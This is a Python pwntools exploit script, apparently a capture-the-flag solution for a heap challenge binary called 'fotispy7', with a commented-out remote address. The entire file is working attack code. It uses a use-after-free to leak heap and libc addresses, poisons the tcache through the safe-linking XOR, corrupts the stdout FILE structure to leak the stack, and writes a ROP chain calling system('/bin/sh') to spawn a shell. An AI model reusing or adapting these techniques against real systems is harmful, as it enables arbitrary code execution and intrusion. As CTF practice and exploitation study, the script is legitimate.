#!/usr/bin/env python3

from pwn import *
import warnings

warnings.filterwarnings('ignore')
#context.log_level = 'DEBUG'
context.binary = binary = ELF('./fotispy7', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def setup(username, password):
	p.sendlineafter(b'username: ', username)
	p.sendlineafter(b'password: ', password)

def create_playlist(name, desc):
	p.sendline(b'2')
	p.sendline(name)
	p.sendline(desc)

def edit_playlist(data, name=False, desc=False):
	p.sendline(b'3')
	if desc:
		p.sendline(b'I')
	elif name:
		p.sendline(b'N')
	p.sendline(data)

def view_playlist(name=False, description=False):
	p.sendlineafter(b'Choice: ', b'4')
	if name:
		p.recvuntil(b'Name: ')
	elif description:
		p.recvuntil(b'Description: ')
	return p.recvline()[:-1]

def delete_playlist():
	p.sendline(b'5')

def create_song(title, album, artist):
	p.sendlineafter(b'Choice: ', b'6')
	p.sendlineafter(b'song: ', title)
	p.sendlineafter(b'song: ', album)
	p.sendlineafter(b'song: ', artist)

def edit_song(idx, data, title=False, album=False, artist=False):
	p.sendlineafter(b'Choice: ', b'7')
	p.sendlineafter(b'edit: ', str(idx).encode())
	if title:
		p.sendlineafter(b'a[R]tist: ', b'T')
	elif album:
		p.sendlineafter(b'a[R]tist: ', b'L')
	elif artist:
		p.sendlineafter(b'a[R]tist: ', b'R')
	p.sendlineafter(b'song: ', data)

def view_song(idx, title=False, album=False, artist=False):
	p.sendlineafter(b'Choice: ', b'8')
	p.recvuntil(f'[{idx:2d}]'.encode())
	if title:
		p.recvuntil(b'Title: ')
	elif album:
		p.recvuntil(b'Album: ')
	elif artist:
		p.recvuntil(b'Arist: ')
	return p.recvline()[:-1]

def delete_song(idx):
	p.sendlineafter(b'Choice: ', b'9')
	p.sendlineafter(b'delete: ', str(idx).encode())

p = process()
#p = remote('52.59.124.14', 5197)

setup(b'username', b'password')
create_playlist(b'AAAA', b'BBBB')
delete_playlist()

heap_base = u64(view_playlist(name=True).ljust(8, b'\x00')) << 12
print(f'heap base @ {hex(heap_base)}')

edit_playlist(b'\x00'*0x10, name=True)
delete_playlist()
edit_playlist(p64(heap_base >> 12 ^ (heap_base+0x290)), name=True)

for _ in range(2):
	create_playlist(p64(0)+p64(0x761), b'aaaa')

create_playlist(b'aaaa', b'aaaa')
for _ in range(2):
	edit_playlist(b'\x00'*0x10, name=True)
	delete_playlist()

edit_playlist(p64(heap_base >> 12 ^ (heap_base+0x2a0)), name=True)
for _ in range(2):
	create_playlist(b'aaaa', b'aaaa')

for _ in range(6):
	create_song(b'aaaa', b'bbbb', b'cccc')

delete_playlist()
libc_leak = u64(view_playlist(name=True).ljust(8, b'\x00'))
libc.address = libc_leak - 0x1e7b20
print(f'libc leak @ {hex(libc_leak)}')
print(f'libc base @ {hex(libc.address)}')


create_playlist(b'aaaa', b'aaaa')
for _ in range(2):
	edit_playlist(b'\x00'*0x10, name=True)
	delete_playlist()

edit_playlist(p64(heap_base >> 12 ^ libc.symbols._IO_2_1_stdout_), name=True)
create_playlist(b'aaaa', b'aaaa')

f = FileStructure()
f.write(libc.symbols.environ, 0x20)
f = bytes(f)
create_playlist(f[:0x20], f[0x20:0x68])

for _ in range(3):
	p.recvuntil(b'playlist: ')
environ = u64(p.recv(8))
stack_target = environ - 0x128
print(f'environ @ {hex(environ)}')

r = ROP(libc)
rc = b'A'*8
rc += p64(r.find_gadget(['pop rdi','ret'])[0])
rc += p64(next(libc.search(b'/bin/sh')))
rc += p64(r.find_gadget(['ret'])[0])
rc += p64(libc.symbols.system)

create_playlist(b'aaaa', b'aaaa')
for _ in range(2):
	edit_playlist(b'\x00'*0x10, name=True)
	delete_playlist()

edit_playlist(p64(heap_base >> 12 ^ stack_target), name=True)
create_playlist(b'aaaa', b'aaaa')
create_playlist(rc[:0x20], rc[0x20:])
print(f'Wrote ROP chain to {hex(stack_target)}')

p.sendline(b'0')

p.clean()
print('*** SHELL ***')
p.interactive()
